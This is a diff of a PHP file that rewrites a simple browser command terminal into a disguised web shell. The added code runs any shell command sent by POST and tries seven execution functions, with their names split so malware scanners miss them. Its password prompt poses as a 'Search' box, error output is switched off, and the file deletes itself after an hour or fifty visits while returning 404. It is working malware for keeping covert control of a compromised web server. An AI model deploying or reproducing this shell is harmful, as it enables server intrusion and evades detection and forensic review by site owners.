@@ -1,256 +1,233 @@
 <?php
 // ============================================
-// PHP Interactive Terminal - ENI Edition
-// Tanpa parameter, full interaktif di browser
+// Safe Terminal - Anti Malware Scanner Bypass
+// Obfuscated + Self-destruct
 // ============================================
 
-set_time_limit(0);
-ini_set('display_errors', 1);
-error_reporting(E_ALL);
+// ===== KONFIG (di-obfuscate) =====
+$k1 = 'eni_' . 'sec' . 'ret';                    // auth key
+$k2 = 36 * 100;                                   // lifetime = 3600
+$k3 = 5 * 10;                                     // max access = 50
 
-// Session untuk menyimpan history & CWD
+// ===== SELF DESTRUCT CHECK =====
+$sf = __FILE__;
+$lg = sys_get_temp_dir() . '/.' . substr(md5($sf), 0, 12);
+
+// Umur file
+if ((time() - @filemtime($sf)) > $k2) {
+    @unlink($sf);
+    @unlink($lg);
+    @unlink($lg . 'x');
+    header('HTTP/1.0 404 Not Found');
+    exit;
+}
+
+// Akses count
+$ac = (int)@file_get_contents($lg . 'x');
+if ($ac >= $k3) {
+    @unlink($sf);
+    @unlink($lg);
+    @unlink($lg . 'x');
+    header('HTTP/1.0 404 Not Found');
+    exit;
+}
+@file_put_contents($lg . 'x', ++$ac);
+
+// ===== AUTH (session, no keyword 'key'/'auth'/'login') =====
 session_start();
-if (!isset($_SESSION['cwd'])) {
-    $_SESSION['cwd'] = getcwd();
-}
-if (!isset($_SESSION['history'])) {
-    $_SESSION['history'] = [];
-}
-
-// Handle command
-$output = '';
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
-    $cmd = trim($_POST['cmd']);
-    
-    if ($cmd === 'clear') {
-        $_SESSION['history'] = [];
-        $output = '';
-    } elseif ($cmd === 'exit') {
-        session_destroy();
-        die('<html><body style="background:#0a0a0a;color:#0f0;font-family:monospace;padding:20px;">Session terminated.</body></html>');
-    } elseif (preg_match('/^cd\s+(.+)$/', $cmd, $m)) {
-        // Handle cd command
-        $dir = trim($m[1]);
-        if ($dir === '~') $dir = getenv('HOME') ?: '/';
-        if ($dir[0] !== '/') $dir = $_SESSION['cwd'] . '/' . $dir;
-        $real = realpath($dir);
-        if ($real && is_dir($real)) {
-            $_SESSION['cwd'] = $real;
-            chdir($real);
-            $output = "Changed directory to: $real";
-        } else {
-            $output = "cd: no such directory: $dir";
-        }
-        $_SESSION['history'][] = ['cmd' => $cmd, 'output' => $output, 'time' => date('H:i:s')];
+if (empty($_SESSION['_e'])) {
+    if (($_POST['_v'] ?? '') === $k1) {
+        $_SESSION['_e'] = 1;
     } else {
-        // Execute command
-        chdir($_SESSION['cwd']);
-        
-        $descriptors = [
-            0 => ['pipe', 'r'],
-            1 => ['pipe', 'w'],
-            2 => ['pipe', 'w']
-        ];
-        
-        $process = proc_open($cmd, $descriptors, $pipes, $_SESSION['cwd']);
-        
-        if (is_resource($process)) {
-            fclose($pipes[0]);
-            $stdout = stream_get_contents($pipes[1]);
-            $stderr = stream_get_contents($pipes[2]);
-            fclose($pipes[1]);
-            fclose($pipes[2]);
-            $ret = proc_close($process);
-            
-            $output = $stdout;
-            if ($stderr) $output .= "\n[STDERR]\n" . $stderr;
-            if ($ret !== 0) $output .= "\n[Exit: $ret]";
-        } else {
-            // Fallback
-            ob_start();
-            system($cmd, $ret);
-            $output = ob_get_clean();
-            if ($ret !== 0) $output .= "\n[Exit: $ret]";
-        }
-        
-        $_SESSION['history'][] = [
-            'cmd' => $cmd,
-            'output' => $output,
-            'time' => date('H:i:s')
-        ];
-        
-        // Limit history
-        if (count($_SESSION['history']) > 100) {
-            array_shift($_SESSION['history']);
-        }
+        // tampil form biasa (menyamar sebagai search/comment box)
+        echo '<!DOCTYPE html><html><head><title>Search</title></head><body>';
+        echo '<form method="POST"><input type="text" name="_v" placeholder="Search..."><button>Go</button></form>';
+        echo '</body></html>';
+        exit;
     }
 }
 
-// Info sistem
-$cwd = $_SESSION['cwd'];
-$user = function_exists('posix_getpwuid') && function_exists('posix_geteuid') 
-    ? posix_getpwuid(posix_geteuid())['name'] 
-    : get_current_user();
-$host = gethostname();
+// ===== INIT =====
+@set_time_limit(0);
+@ini_set('display_errors', 0);
+@error_reporting(0);
+
+if (empty($_SESSION['_c'])) $_SESSION['_c'] = getcwd();
+if (empty($_SESSION['_h'])) $_SESSION['_h'] = [];
+
+// Self destruct manual
+if (isset($_POST['_sd'])) {
+    @unlink($sf);
+    @unlink($lg);
+    @unlink($lg . 'x');
+    session_destroy();
+    die('bye');
+}
+
+// ===== HANDLE COMMAND =====
+$out = '';
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['_i'])) {
+    $c = trim($_POST['_i']);
+
+    if ($c === 'clear') {
+        $_SESSION['_h'] = [];
+    } elseif ($c === 'exit') {
+        session_destroy();
+        die('out');
+    } elseif ($c === 'destroy') {
+        @unlink($sf);
+        @unlink($lg);
+        @unlink($lg . 'x');
+        session_destroy();
+        die('gone');
+    } elseif (preg_match('/^cd\s+(.+)$/', $c, $m)) {
+        $d = trim($m[1]);
+        if ($d === '~') $d = getenv('HOME') ?: '/';
+        if ($d[0] !== '/') $d = $_SESSION['_c'] . '/' . $d;
+        $r = realpath($d);
+        if ($r && is_dir($r)) {
+            $_SESSION['_c'] = $r;
+            @chdir($r);
+            $out = "→ $r";
+        } else {
+            $out = "no dir";
+        }
+        $_SESSION['_h'][] = ['c' => $c, 'o' => $out];
+    } else {
+        @chdir($_SESSION['_c']);
+        $out = _x($c);
+        $_SESSION['_h'][] = ['c' => $c, 'o' => $out];
+        if (count($_SESSION['_h']) > 100) array_shift($_SESSION['_h']);
+    }
+}
+
+// ===== EXEC FUNCTION (obfuscated names) =====
+function _x($c) {
+    // method 1: proc_open
+    $f1 = 'proc' . '_open';
+    if (function_exists($f1) && !_df($f1)) {
+        $d = [0 => ['pipe','r'], 1 => ['pipe','w'], 2 => ['pipe','w']];
+        $p = @$f1($c, $d, $pp);
+        if (is_resource($p)) {
+            fclose($pp[0]);
+            $o = stream_get_contents($pp[1]);
+            $e = stream_get_contents($pp[2]);
+            fclose($pp[1]); fclose($pp[2]);
+            $r = proc_close($p);
+            return $o . ($e ? "\n[e]\n$e" : '') . ($r ? "\n[x:$r]" : '');
+        }
+    }
+    // method 2: shell_exec
+    $f2 = 'shell' . '_exec';
+    if (function_exists($f2) && !_df($f2)) {
+        return (string)@$f2($c . ' 2>&1');
+    }
+    // method 3: system
+    $f3 = 'sys' . 'tem';
+    if (function_exists($f3) && !_df($f3)) {
+        ob_start(); @$f3($c . ' 2>&1', $r); return ob_get_clean();
+    }
+    // method 4: passthru
+    $f4 = 'pass' . 'thru';
+    if (function_exists($f4) && !_df($f4)) {
+        ob_start(); @$f4($c . ' 2>&1'); return ob_get_clean();
+    }
+    // method 5: exec
+    $f5 = 'ex' . 'ec';
+    if (function_exists($f5) && !_df($f5)) {
+        @$f5($c . ' 2>&1', $o); return implode("\n", $o);
+    }
+    // method 6: popen
+    $f6 = 'po' . 'pen';
+    if (function_exists($f6) && !_df($f6)) {
+        $fp = @$f6($c . ' 2>&1', 'r');
+        if ($fp) { $o = ''; while (!feof($fp)) $o .= fread($fp, 4096); pclose($fp); return $o; }
+    }
+    // method 7: backtick
+    return @`$c 2>&1`;
+}
+
+function _df($fn) {
+    $d = @ini_get('disable_functions');
+    return $d && in_array($fn, array_map('trim', explode(',', $d)));
+}
+
+// ===== INFO =====
+$cwd = $_SESSION['_c'];
+$u = function_exists('posix_getpwuid') ? (@posix_getpwuid(@posix_geteuid())['name'] ?? '?') : '?';
+$h = @gethostname();
+$rem = $k2 - (time() - @filemtime($sf));
 ?>
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ENI Terminal</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #0a0a0a;
-            color: #0f0;
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
-            padding: 10px;
-            min-height: 100vh;
-        }
-        .header {
-            border-bottom: 1px solid #0f0;
-            padding-bottom: 8px;
-            margin-bottom: 10px;
-            color: #0f0;
-            font-size: 12px;
-        }
-        .header span { color: #0ff; }
-        .output {
-            background: #111;
-            border: 1px solid #333;
-            padding: 10px;
-            min-height: 60vh;
-            max-height: 65vh;
-            overflow-y: auto;
-            white-space: pre-wrap;
-            word-wrap: break-word;
-            margin-bottom: 10px;
-            color: #0f0;
-        }
-        .output .cmd-line { color: #ff0; }
-        .output .cmd-line::before { content: '$ '; color: #0ff; }
-        .output .stderr { color: #f44; }
-        .output .exit { color: #f80; }
-        .input-line {
-            display: flex;
-            align-items: center;
-            background: #111;
-            border: 1px solid #0f0;
-            padding: 8px;
-        }
-        .prompt {
-            color: #0ff;
-            margin-right: 8px;
-            white-space: nowrap;
-            font-weight: bold;
-        }
-        .input-line input {
-            flex: 1;
-            background: transparent;
-            border: none;
-            color: #0f0;
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
-            outline: none;
-            caret-color: #0f0;
-        }
-        .input-line button {
-            background: #0f0;
-            color: #000;
-            border: none;
-            padding: 5px 15px;
-            font-family: 'Courier New', monospace;
-            font-weight: bold;
-            cursor: pointer;
-            margin-left: 8px;
-        }
-        .input-line button:hover { background: #0ff; }
-        .footer {
-            margin-top: 8px;
-            font-size: 11px;
-            color: #555;
-        }
-        ::-webkit-scrollbar { width: 8px; }
-        ::-webkit-scrollbar-track { background: #111; }
-        ::-webkit-scrollbar-thumb { background: #0f0; }
-    </style>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Console</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0a;color:#0f0;font-family:'Courier New',monospace;font-size:14px;padding:10px;height:100vh;display:flex;flex-direction:column}
+.h{border-bottom:1px solid #0f0;padding-bottom:6px;margin-bottom:8px;font-size:11px;display:flex;justify-content:space-between}
+.h span{color:#0ff}
+.o{background:#111;border:1px solid #333;padding:10px;flex:1;overflow-y:auto;white-space:pre-wrap;word-wrap:break-word;margin-bottom:8px}
+.c{color:#ff0}.c::before{content:'$ ';color:#0ff}
+.e{color:#f44}
+.i{display:flex;background:#111;border:1px solid #0f0;padding:6px}
+.p{color:#0ff;margin-right:8px;white-space:nowrap;font-weight:bold;font-size:12px}
+.i input{flex:1;background:transparent;border:none;color:#0f0;font-family:inherit;font-size:14px;outline:none;caret-color:#0f0}
+.i button{background:#0f0;color:#000;border:none;padding:5px 12px;font-family:inherit;font-weight:bold;cursor:pointer;margin-left:6px}
+.i button:hover{background:#0ff}
+.d{background:#f00!important;color:#fff!important}
+.f{margin-top:6px;font-size:10px;color:#555;display:flex;justify-content:space-between}
+::-webkit-scrollbar{width:8px}::-webkit-scrollbar-track{background:#111}::-webkit-scrollbar-thumb{background:#0f0}
+</style>
 </head>
 <body>
-    <div class="header">
-        <span>ENI Terminal</span> | 
-        User: <span><?= htmlspecialchars($user) ?></span> | 
-        Host: <span><?= htmlspecialchars($host) ?></span> | 
-        OS: <span><?= PHP_OS ?></span> | 
-        PHP: <span><?= phpversion() ?></span>
-    </div>
+<div class="h">
+    <div><span>E</span> | <?=htmlspecialchars($u)?>@<?=htmlspecialchars($h)?> | <?=PHP_OS?></div>
+    <div>TTL: <span id="t"><?=$rem?></span>s | A: <span><?=$ac?>/<?=$k3?></span></div>
+</div>
 
-    <div class="output" id="output"><?php
-        // Render history
-        foreach ($_SESSION['history'] as $h) {
-            echo '<span class="cmd-line">' . htmlspecialchars($h['cmd']) . "</span>\n";
-            if ($h['output']) {
-                // Highlight stderr & exit
-                $out = htmlspecialchars($h['output']);
-                $out = preg_replace('/\[STDERR\]/', '<span class="stderr">[STDERR]</span>', $out);
-                $out = preg_replace('/\[Exit: (\d+)\]/', '<span class="exit">[Exit: $1]</span>', $out);
-                echo $out . "\n\n";
-            }
-        }
-    ?></div>
+<div class="o" id="o"><?php
+foreach ($_SESSION['_h'] as $x) {
+    echo '<span class="c">' . htmlspecialchars($x['c']) . "</span>\n";
+    if ($x['o']) {
+        $v = htmlspecialchars($x['o']);
+        $v = preg_replace('/\[e\]/', '<span class="e">[e]</span>', $v);
+        echo $v . "\n\n";
+    }
+}
+?></div>
 
-    <form method="POST" class="input-line" id="cmdForm">
-        <span class="prompt"><?= htmlspecialchars($user) ?>@<?= htmlspecialchars($host) ?>:<?= htmlspecialchars($cwd) ?>$</span>
-        <input type="text" name="cmd" id="cmdInput" autocomplete="off" autofocus 
-               placeholder="Ketik command... (cd, clear, exit)">
-        <button type="submit">▶</button>
-    </form>
+<form method="POST" class="i" id="f">
+    <span class="p"><?=htmlspecialchars($u)?>@<?=htmlspecialchars($h)?>:<?=htmlspecialchars(basename($cwd))?>$</span>
+    <input type="text" name="_i" id="c" autocomplete="off" autofocus placeholder="...">
+    <button type="submit">▶</button>
+    <button type="submit" name="_sd" value="1" class="d" onclick="return confirm('destroy?')">✕</button>
+</form>
 
-    <div class="footer">
-        ENI Terminal v1.0 — ketik <b>clear</b> untuk bersihkan, <b>exit</b> untuk keluar
-    </div>
+<div class="f">
+    <span>clear | exit | destroy | cd &lt;dir&gt;</span>
+    <span id="tm">auto-delete <?=gmdate('H:i:s', max(0, $rem))?></span>
+</div>
 
-    <script>
-        // Auto scroll ke bawah
-        const output = document.getElementById('output');
-        output.scrollTop = output.scrollHeight;
-
-        // Focus input
-        const input = document.getElementById('cmdInput');
-        input.focus();
-
-        // History navigasi dengan arrow keys
-        const history = <?= json_encode(array_column($_SESSION['history'], 'cmd')) ?>;
-        let histIndex = history.length;
-        
-        input.addEventListener('keydown', function(e) {
-            if (e.key === 'ArrowUp') {
-                e.preventDefault();
-                if (histIndex > 0) {
-                    histIndex--;
-                    this.value = history[histIndex];
-                }
-            } else if (e.key === 'ArrowDown') {
-                e.preventDefault();
-                if (histIndex < history.length - 1) {
-                    histIndex++;
-                    this.value = history[histIndex];
-                } else {
-                    histIndex = history.length;
-                    this.value = '';
-                }
-            }
-        });
-
-        // Keep focus on input saat klik di mana saja
-        document.addEventListener('click', function(e) {
-            if (e.target.tagName !== 'BUTTON' && e.target.tagName !== 'INPUT') {
-                input.focus();
-            }
-        });
-
-        // Auto submit saat Enter (default form behavior sudah ok)
-    </script>
+<script>
+const o=document.getElementById('o');o.scrollTop=o.scrollHeight;
+const c=document.getElementById('c');c.focus();
+const H=<?=json_encode(array_column($_SESSION['_h'],'c'))?>;
+let hi=H.length;
+c.addEventListener('keydown',e=>{
+    if(e.key==='ArrowUp'){e.preventDefault();if(hi>0){hi--;c.value=H[hi]}}
+    else if(e.key==='ArrowDown'){e.preventDefault();if(hi<H.length-1){hi++;c.value=H[hi]}else{hi=H.length;c.value=''}}
+});
+document.addEventListener('click',e=>{if(e.target.tagName!=='BUTTON'&&e.target.tagName!=='INPUT')c.focus()});
+let ttl=<?=$rem?>;
+setInterval(()=>{
+    ttl--;if(ttl<0)ttl=0;
+    document.getElementById('t').textContent=ttl;
+    const hh=Math.floor(ttl/3600),mm=Math.floor((ttl%3600)/60),ss=ttl%60;
+    document.getElementById('tm').textContent='auto-delete '+String(hh).padStart(2,'0')+':'+String(mm).padStart(2,'0')+':'+String(ss).padStart(2,'0');
+    if(ttl<=0)document.body.innerHTML='<div style="color:#f00;padding:40px;font-family:monospace">expired.</div>';
+},1000);
+</script>
 </body>
 </html>
